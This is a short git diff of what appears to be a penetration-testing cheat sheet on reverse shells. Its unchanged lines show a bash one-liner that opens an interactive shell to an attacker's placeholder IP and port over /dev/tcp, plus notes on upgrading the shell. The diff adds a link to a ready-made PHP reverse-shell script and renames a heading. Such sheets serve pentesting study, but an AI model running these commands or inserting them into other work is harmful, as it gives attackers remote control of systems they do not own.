@@ -4,6 +4,10 @@
 
 	bash -c "bash -i >& /dev/tcp/<YOUR_IP>/<NETCAT_PORT> 0>&1"
 
+## PHP
+
+	https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+
 
 ## Fully interactive shell
 
@@ -19,7 +23,7 @@ Put nc in the background
 	export TERM=xterm
 
 
-## Cookbook
+## Tips
 
 Ugrading the the reverse shell we got
 
